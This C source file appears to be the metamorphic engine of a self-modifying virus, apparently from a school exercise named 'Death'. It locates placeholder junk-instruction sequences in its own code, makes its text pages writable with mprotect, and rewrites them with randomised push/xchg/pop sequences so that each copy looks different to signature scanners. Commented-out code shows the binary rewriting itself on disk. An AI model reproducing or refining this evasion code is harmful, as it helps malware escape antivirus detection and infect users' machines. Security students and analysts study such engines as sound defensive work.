#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>


#include "utils.h"
#include "death.h"
#include "syscall.h"

__attribute__((section(".text#"))) int g_junk_offsets[1000] = {0};

/*
   This is the matrix of source and destination register opcodes for Intel.
   For example;
   0xB8 == "mov"
   0xB8 + 0xC0 == 0x178 "mov eax, eax"
   0xB8 + 0xC8 == 0x180 "mov eax, ebx"

	   EAX ECX EDX EBX ESP EBP ESI EDI
   EAX C0  C8  D0  D8  E0  E8  F0  F8
   ECX C1  C9  D1  D9  E1  E9  F1  F9
   EDX C2  CA  D2  DA  E2  EA  F2  FA
   EBX C3  CB  D3  DB  E3  EB  F3  FB
   ESP C4  CC  D4  DC  E4  EC  F4  FC
   EBP C5  CD  D5  DD  E5  ED  F5  FD
   ESI C6  CE  D6  DE  E6  EE  F6  FE
   EDI C7  CF  D7  DF  E7  EF  F7  FF
*/

static int find_pattern(uint8_t *self, size_t offset) {
	return (self[offset] == PUSH_OP &&
			self[offset + 1] == PUSH_RBX &&

			self[offset + 2] == OP_64 &&
			self[offset + 3] == XCHG &&
			self[offset + 4] == RAX_RAX &&

			self[offset + 5] == OP_64 &&
			self[offset + 6] == XCHG &&
			self[offset + 7] == RAX_RAX &&

			self[offset + 8] == POP_RBX &&
			self[offset + 9] == POP_OP);
}

static void fill_offsets(uint8_t *self, size_t size, int *junk_offsets) {

	if (junk_offsets[0] != 0) {
		return;
	}

	int j = 0;
	for (size_t i = 0; i < size - JUNK_LEN; i++) {
		if (find_pattern(self, i) && j < NB_JUNK_MAX) {
			junk_offsets[j] = i;
			j++;
		}
	}
}

static void gen_junk(uint8_t *rdm_junk) {
	uint8_t reg_1 = ((uint8_t)gen_key_64()) % 8;
	uint8_t reg_2 = ((uint8_t)gen_key_64()) % 8;

	while (reg_1 == reg_2) {
		reg_2 = ((uint8_t)gen_key_64()) % 8;
	}

	JUNK;

	uint8_t push_1 = PUSH_OP + reg_1;
	uint8_t push_2 = PUSH_OP + reg_2;

	uint8_t pop_1 = POP_OP + reg_1;
	uint8_t pop_2 = POP_OP + reg_2;

	uint8_t nop[3] = {OP_64, XCHG, RAX_RAX};
	nop[2] += reg_1;
	nop[2] += (reg_2 << 3);

	rdm_junk[0] = push_1;
	rdm_junk[1] = push_2;
	rdm_junk[2] = nop[0];
	rdm_junk[3] = nop[1];
	rdm_junk[4] = nop[2];
	rdm_junk[5] = nop[0];
	rdm_junk[6] = nop[1];
	rdm_junk[7] = nop[2];
	rdm_junk[8] = pop_2;
	rdm_junk[9] = pop_1;

	JUNK;
}

static void replace_nop(uint8_t *self, int *junk_offsets) {
	for (size_t i = 0; i < NB_JUNK_MAX ; i++) {
		/* at this point junk_offsets is filled */
		if (junk_offsets[i] == 0) {
			break;
		}
		uint8_t rdm_junk[10];
		gen_junk(rdm_junk);
		ft_memcpy(self + junk_offsets[i], rdm_junk, JUNK_LEN);

	}
}

static int make_writeable(uint8_t *self, size_t size) {
	uintptr_t start = (uintptr_t)self;
	uintptr_t end = start + size;

	uintptr_t page_start = start & ~(PAGE_SIZE - 1);
	uintptr_t page_end = (end + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);

	if (mprotect((void *)page_start, page_end - page_start, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
		return -1;
	}
	return 0;
}

void prepare_mutate(void) {

	uintptr_t start = (uintptr_t)&_start;

	make_writeable((uint8_t *)start, VIRUS_SIZE);

	fill_offsets((uint8_t *)start, VIRUS_SIZE, g_junk_offsets);
}

void mutate(void) {

	JUNK;

	uintptr_t start = (uintptr_t)&_start;

	replace_nop((uint8_t *)start, g_junk_offsets);
}

//static int abs_path(char *self_name) {
//	char buf[PATH_MAX];
//	char proc_self_exe[] = "/proc/self/exe";
//
//	int ret = readlink(proc_self_exe, buf, PATH_MAX);
//	if (ret == -1) {
//		return -1;
//	}
//	buf[ret] = '\0';
//
//	ft_strncpy(self_name, buf, PATH_MAX);
//
//	return 0;
//}

//
//int prepare_mutate(file_t *file) {
//
//	char self_name[PATH_MAX];
//
//	if (abs_path(self_name) == -1) {
//		return -1;
//	}
//
//	struct stat st;
//	/* we could open the file with O_RDWR but text file is busy */
//	int fd = open(self_name, O_RDONLY);
//
//	if (fd == -1) {
//		return -1;
//	}
//
//	if (fstat(fd, &st) == -1) {
//		close(fd);
//		return -1;
//	}
//
//	/* we could use MAP_SHARED but we can't open the file with O_RDWR */
//	uint8_t *self = (uint8_t *)mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
//	if (self == MAP_FAILED) {
//		close(fd);
//		return -1;
//	}
//
//	close(fd);
//
//	t_fileview mainview = {self, st.st_size};
//
//	file->view = &mainview;
//	file->mode = st.st_mode;
//	ft_strncpy(file->abs_path, self_name, PATH_MAX);
//
//	return 0;
//}
//
//int death(file_t *file) {
//
//	int fd;
//	t_fileview *view = file->view;
//	char *self_name = file->abs_path;
//
//	if (unlink(self_name) == -1) {
//		munmap(view->data, view->size);
//		return -1;
//	}
//
//	fd = open(self_name, O_CREAT | O_WRONLY | O_TRUNC, file->mode);
//	if (fd == -1)
//		return -1;
//
//	if (write(fd, view->data, view->size) == -1) {
//		close(fd);
//		munmap(view->data, view->size);
//		return -1;
//	}
//
//	if (munmap(view->data, view->size) == -1) {
//		close(fd);
//		return -1;
//	}
//
//	close(fd);
//
//	return 0;
//}
